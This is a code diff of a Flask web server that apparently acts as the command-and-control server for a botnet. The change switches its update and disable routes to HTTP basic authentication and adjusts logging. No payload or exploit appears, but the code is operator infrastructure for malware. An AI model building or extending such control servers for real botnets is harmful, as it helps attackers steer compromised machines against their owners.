@@ -1,6 +1,6 @@
 from flask import Flask
 from flask import request
-from CCServer import CCServer 
+from CCServer import CCServer
 
 import logging
 from logging.handlers import RotatingFileHandler
@@ -45,21 +45,22 @@ def getSettings():
 # ROUTING SERVER - update settings 
 @app.route('/update', methods=['POST'])
 def updateSettings():
-    # retrieving username and password 
-    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
+    # retrieving username and password
+    auth = request.authorization
+    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
         # if user is correctly authenticated we can performe update op.
         try:
             CC.updateSettings(request.json['settings'])
-            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+            app.logger.info("[{0}] => reached by {1} / {2}: settings override!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
             return "Override succeded", 200
-        except KeyError as error:
+        except TypeError as error:
             # if settings is missing as a param... update cannot be carried on
-            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+            app.logger.info("[{0}] => reached by {1} / {2}: override failure, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
             return "Bad request, override failure", 400
 
     else:
         # if user was not authenticated properly, we log the event and return a forbidden status
-        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+        app.logger.info("[{0}] => reached by {1} / {2}: forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
         return "Forbidden!", 403
 
 
@@ -80,20 +81,21 @@ def getLog():
 # ROUTING SERVER - disable the botnet via C&C
 @app.route('/disable', methods=['POST'])
 def disableBotnet():
-    # retrieving username and password 
-    if CC.authenticate({ 'auth_usr'  : request.json['username'], 'auth_pwd' : request.json['password'] }): 
+    # retrieving username and password
+    auth = request.authorization
+    if CC.authenticate({ 'auth_usr'  : auth.username, 'auth_pwd' : auth.password }):
         # if user is correctly authenticated we can performe update op.
         try:
             CC.updateSettings({}, enable=False)
-            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disabled!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
             return "Botnet disabled!", 200
         except KeyError as error:
             # if settings is missing as a param... update cannot be carried on
-            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+            app.logger.info("[{0}] => reached by {1} / {2}: botnet disable, missing params!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
             return "Bad request, botnet disable failure", 400
     else:
         # if user was not authenticated properly, we log the event and return a forbidden status
-        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, request.json['username']))
+        app.logger.info("[{0}] => reached by {1} / {2}: disable operation forbidden!".format(str(datetime.utcnow()), request.remote_addr, auth.username))
         return "Forbidden!", 403
 
 
